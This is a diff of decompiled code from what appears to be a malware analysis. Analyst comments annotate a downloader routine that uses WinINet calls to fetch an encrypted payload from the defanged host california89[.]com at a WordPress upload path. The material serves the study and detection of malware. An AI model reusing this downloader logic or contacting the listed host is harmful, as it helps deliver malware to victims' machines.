@@ -80,7 +80,7 @@ LABEL_14:
         while ( 1 )
         {
           v10 = InternetConnectW((HINTERNET)v31, (&lpszServerName)[(_DWORD)lpBuffer], 0x1BBu, 0, 0, 3u, 0, 0);
-// InternetConnectW API held in v10 variable
+// InternetConnectW API held in v10 variable [Updates downloader, lpszAcceptTypes = text/application/*]
 // v31 used as the User-Agent argument
 // &lpszServerName is a global data variable holding california89[.]com
           if ( v10 )
@@ -92,6 +92,8 @@ LABEL_14:
         while ( 1 )
         {
           v11 = HttpOpenRequestW(v10, 0, (&lpszObjectName)[(_DWORD)lpBuffer], 0, 0, lpszAcceptTypes, 0x80803000, 0);
+// HttpOpenRequestW API held in the v11 variable
+// &lpszObjectName is a global data variable containing "/wp-content/uploads/2013/05/pdf.enc"
           hFile = v11;
           if ( v11 )
             break;
@@ -104,7 +106,7 @@ LABEL_14:
         InternetSetOptionW(v11, 0x1Fu, &Buffer, 4u);
         for ( i = 0; i < 2; ++i )
         {
-          if ( HttpSendRequestW(v11, 0, 0, 0, 0) )
+          if ( HttpSendRequestW(v11, 0, 0, 0, 0) ) // HttpSendRequestW is called from arguments in v11
             break;
         }
         if ( i != 2 )
@@ -127,7 +129,7 @@ LABEL_14:
       for ( nNumberOfBytesToRead = 0; (int)nNumberOfBytesToRead < 20; ++nNumberOfBytesToRead )
       {
         v15 = v14;
-        for ( k = InternetReadFile(hFile, v14, dwBytes, &NumberOfBytesRead);
+        for ( k = InternetReadFile(hFile, v14, dwBytes, &NumberOfBytesRead); // Download the data from california89[.]com/wp-content/uploads/2013/05/pdf.enc
               k;
               k = InternetReadFile(hFile, v15, dwBytes, &NumberOfBytesRead) )
         {
